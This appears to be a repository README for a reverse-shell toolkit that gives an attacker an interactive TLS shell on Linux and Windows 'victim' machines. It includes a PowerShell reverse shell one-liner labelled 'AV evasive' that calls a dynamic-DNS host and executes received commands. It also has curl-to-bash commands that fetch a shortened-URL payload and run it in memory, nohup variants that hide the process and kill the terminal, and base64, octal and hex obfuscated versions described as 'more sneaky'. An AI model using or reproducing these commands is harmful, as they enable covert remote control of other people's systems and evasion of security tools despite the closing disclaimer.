# 🚀 TTY Shell Stabilizer Toolkit (Secure TLS Version)

A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY using **TLS encryption** and **password authentication**. This version uses a single-connection coordinated flow for maximum stability and interactive PTY support.

## 📂 Scripts


| Script | Role | Method |
|---|---|---|
| bash_tty.sh | Attacker | Socat TLS listener with `stty raw` for full TTY support. |
| victim.sh | Linux Victim | OpenSSL s_client + `/usr/bin/script` for interactive PTY. |
| Windows One-Liner | Windows Victim | PowerShell .NET SslStream (Direct Single Connection). |

------------------------------

## 🛠 Usage Instructions

### 1. Attacker Side (Listener)
The listener generates a temporary RSA certificate in RAM (`/dev/shm`), sets the local terminal to `raw` mode to pass all keystrokes (Tab, Ctrl+C, arrows), and waits for a connection.

**Usage:**
```bash
./bash_tty.sh <port> <password>
```
*Example:* `./bash_tty.sh 2222 mysecretpass`

------------------------------

## 2. Victim Side (Connection)

### 🐧 Linux (Interactive TTY)
On the target machine, providing the password will trigger an interactive TTY using `script`. This allows for `sudo`, `nano`, and tab-completion.

**Usage:**
```bash
./victim.sh <attacker_ip> <port> <password>
```
*Example:* `./victim.sh 10.0.13.7 2222 mysecretpass`

### 🪟 Windows (AV Evasive One-Liner)
This implementation uses native .NET classes to establish a single TLS tunnel. It is designed to work seamlessly with the attacker's raw terminal mode.

**One-Liner (Update variables):**
```powershell
$IP="x86david.ddns.net"; $P=2244; $pw="password"; $cb={$true}; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("READY"); if($r.ReadLine().Trim() -eq $pw){ while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $w.Flush(); $t=""; while($c.Connected){ $k=$r.Read(); if($k -eq 13 -or $k -eq 10 -or $k -eq -1){break} if($k -eq 8){ if($t.Length -gt 0){ $t=$t.Substring(0,$t.Length-1); $w.Write("`b `b"); $w.Flush() } continue } $char=[char]$k; $t+=$char; $w.Write($char); $w.Flush() } if($t.Trim().Length -gt 0){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write("`r`n"+$o) }catch{ $w.Write("`r`n"+$_.Exception.Message) } } } } $c.Close() } catch { }
```

------------------------------

## 💡 Quick Tips

### Execution via Remote Pipe (Kali Attacker)
Download and run the listener in memory. Ensure you provide the port and password as arguments.
```bash
source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh) 2222 mysecretpass
```

### Execution via Remote Pipe (Linux Victim)
Execute the shell directly in memory without leaving files on disk:
```bash
bash <(curl -sSL https://tinyurl.com/sheepx) 10.0.13.7 2222 mysecretpass
```

Nohup version:
```bash
nohup bash -c "bash <(curl -sSL https://tinyurl.com/sheepx) x86david.ddns.net 2244 password" > /dev/null 2>&1 & disown; clear; kill -9 $PPID
```

Brief Breakdown

    nohup ... &: Runs the command in the background and keeps it alive after you log out.

    bash -c "...": Allows nohup to run complex logic (like the curl pipe) as a single task.

    bash <(curl ...): Downloads and executes a script directly from a URL into memory (no file saved to disk).

    > /dev/null 2>&1: Completely silences the command by blocking all logs and error messages.

    disown: Tells the shell to "forget" the background job so it doesn't block the exit.

    kill -9 $PPID: Force-kills the Parent Process ID (the terminal window itself), ensuring the session closes even if multiple shells are nested.





This ones are more sneaky... Remember, use cyberchef to replace the Hex and base64 strings with your commands or parameters....

[CyberChef]https://gchq.github.io/CyberChef


If nohup is available, it's useful to keep the shell alive when user exits the terminal. It's up to you.

```bash
nohup command_name > /dev/null 2>&1 &
```


## Kill the sub-processes if you need to later on:

Find them:
```bash
ps aux | grep -E 'x86david|2244'
```
Kill by name or number
```bash
pkill -f "x86david"
```
Check alive connections in that port: 
```bash
ss -antp | grep 2244
```


## Normal obfuscated commands

Base64 version
```bash
bash <(curl -sSL $(echo "aHR0cHM6Ly90aW55dXJsLmNvbS9zaGVlcHg=" | base64 -d)) \
  $(echo "eDg2ZGF2aWQuZGRucy5uZXQ=" | base64 -d) \
  $(echo "MjI0NA==" | base64 -d) \
  $(echo "cGFzc3dvcmQ=" | base64 -d)
```

Octal/Mixed version
```bash
bash <(curl -sSL $(printf '\150\164\164\160\163\72\57\57\164\151\156\171\165\162\154\56\143\157\155\57\163\150\145\145\160\170')) \
  $(printf '\170\70\66\144\141\166\151\144\56\144\144\156\163\56\156\145\164') \
  $(echo "MjI0NA==" | base64 -d) \
  $(printf '\160\141\163\163\167\157\162\144')
```

Hex/Eval version
```bash
eval "$(printf '\x62\x61\x73\x68\x20\x3c\x28\x63\x75\x72\x6c\x20\x2d\x73\x53\x4c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x69\x6e\x79\x75\x72\x6c\x2e\x63\x6f\x6d\x2f\x73\x68\x65\x65\x70\x78\x29\x20\x78\x38\x36\x64\x61\x76\x69\x64\x2e\x64\x64\x6e\x73\x2e\x6e\x65\x74\x20\x32\x32\x34\x34\x20\x70\x61\x73\x73\x77\x6f\x72\x64')"
```
## NOHUP (BACKGROUND) obfuscated commands

Don't kill the parent process if you don't want to.

Base64 version
```bash
nohup bash -c "bash <(curl -sSL \$(echo 'aHR0cHM6Ly90aW55dXJsLmNvbS9zaGVlcHg=' | base64 -d)) \$(echo 'eDg2ZGF2aWQuZGRucy5uZXQ=' | base64 -d) \$(echo 'MjI0NA==' | base64 -d) \$(echo 'cGFzc3dvcmQ=' | base64 -d)" > /dev/null 2>&1 & disown; clear; kill -9 $PPID

```

Octal/Mixed version
```bash
nohup bash -c "bash <(curl -sSL \$(printf '\150\164\164\160\163\72\57\57\164\151\156\171\165\162\154\56\143\157\155\57\163\150\145\145\160\170')) \$(printf '\170\70\66\144\141\166\151\144\56\144\144\156\163\56\156\145\164') \$(echo 'MjI0NA==' | base64 -d) \$(printf '\160\141\163\163\167\157\162\144')" > /dev/null 2>&1 & disown; clear; kill -9 $PPID

```
Hex/Eval version
```bash
nohup bash -c "eval \"\$(printf '\x62\x61\x73\x68\x20\x3c\x28\x63\x75\x72\x6c\x20\x2d\x73\x53\x4c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x69\x6e\x79\x75\x72\x6c\x2e\x63\x6f\x6d\x2f\x73\x68\x65\x65\x70\x78\x29\x20\x78\x38\x36\x64\x61\x76\x69\x64\x2e\x64\x64\x6e\x73\x2e\x6e\x65\x74\x20\x32\x32\x34\x34\x20\x70\x61\x73\x73\x77\x6f\x72\x64')\"" > /dev/null 2>&1 & disown; clear; kill -9 $PPID
```




### Execution via CMD (Windows Victim)
Run the one-liner from a standard CMD prompt:
```cmd
$IP="x86david.ddns.net"; $P=2244; $pw="password"; $cb={$true}; try { $c=New-Object System.Net.Sockets.TCPClient($IP,$P); $tl=New-Object System.Net.Security.SslStream($c.GetStream(),$false,$cb); $tl.AuthenticateAsClient($IP); $r=New-Object System.IO.StreamReader($tl); $w=New-Object System.IO.StreamWriter($tl); $w.AutoFlush=$true; $w.WriteLine("READY"); if($r.ReadLine().Trim() -eq $pw){ while($c.Connected){ $w.Write("`r`nPS "+(pwd).Path+"> "); $w.Flush(); $t=""; while($c.Connected){ $k=$r.Read(); if($k -eq 13 -or $k -eq 10 -or $k -eq -1){break} if($k -eq 8){ if($t.Length -gt 0){ $t=$t.Substring(0,$t.Length-1); $w.Write("`b `b"); $w.Flush() } continue } $char=[char]$k; $t+=$char; $w.Write($char); $w.Flush() } if($t.Trim().Length -gt 0){ try{ $o=(IEX $t 2>&1 | Out-String); $w.Write("`r`n"+$o) }catch{ $w.Write("`r`n"+$_.Exception.Message) } } } } $c.Close() } catch { }
```

------------------------------

## 🔄 Automatic Re-listening
The attacker script is designed to be "eternal". After a session ends (by typing `exit`), the terminal is restored, and the listener automatically re-arms for the next victim.

## ⚠️ Terminal Recovery
If a session is interrupted and your terminal behaves strangely (e.g., no text visible or `Enter` not working), the script should auto-restore it. If not, manually run:
```bash
stty sane
# or
reset
```

------------------------------
**Disclaimer:** For authorized security testing and administrative purposes only.
